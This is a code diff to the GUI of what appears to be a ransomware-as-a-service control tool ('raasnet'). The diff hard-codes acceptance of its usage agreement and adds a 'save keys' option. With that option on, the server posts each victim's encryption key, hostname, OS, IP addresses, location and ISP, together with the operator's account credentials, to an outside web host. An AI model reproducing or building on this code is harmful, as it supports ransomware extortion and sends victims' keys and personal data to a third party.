@@ -329,6 +329,7 @@ class MainWindow(Tk):
             'agreed' : IntVar(),
             'host' : StringVar(),
             'port' : IntVar(),
+            'save_keys' : IntVar(),
             'remote' : StringVar(),
             'local' : StringVar(),
             'platform' : StringVar(),
@@ -367,7 +368,7 @@ class MainWindow(Tk):
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -386,6 +387,7 @@ class MainWindow(Tk):
         # Default Settings
         self.options['host'].set('127.0.0.1')
         self.options['port'].set(8989)
+        self.options['save_keys'].set(0)
         self.options['full_screen_var'].set(0)
         self.options['mode'].set(1)
         self.options['demo'].set(0)
@@ -692,6 +694,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         Label(self.set, text = 'port', background = 'white').grid(row = 3, column = 0, sticky = 'w')
         port = Entry(self.set, textvariable = self.options['port'], width = 30)
         port.grid(row = 4, column = 0, columnspan = 2)
+
+        Checkbutton(self.set, text = "Save keys to raasnet.zeznzo.nl account", variable = self.options['save_keys'], onvalue = 1, offvalue = 0).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')
 
         if host == None or host == '':
             messagebox.showwarning('ERROR', 'Invalid host!')
@@ -1061,7 +1065,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
     def check_settings(self):
         if self.options['mode'].get() == 2:
             self.options['full_screen_var'].set(0)
-            #messagebox.showwarning('Disabled', 'Fullscreen is available for GUI mode only, this option have been disabled!')
 
     def make_demon(self):
 
@@ -1157,6 +1160,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
     def start_server(self):
         host = self.options['host'].get()
         port = self.options['port'].get()
+        save_keys = self.options['save_keys'].get()
         socket_list = []
 
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1222,6 +1226,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                             self.serv.options['log'].insert(END, result, 'yellow')
                             self.serv.options['log'].see(END)
 
+                            if save_keys == 1:
+                                payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'Region' : region, 'City' : city , 'ISP' : isp, 'ZIP' : zip}
+                                r = requests.post('https://zeznzo.nl/post.py', data=payload)
                         else:
                             break
 
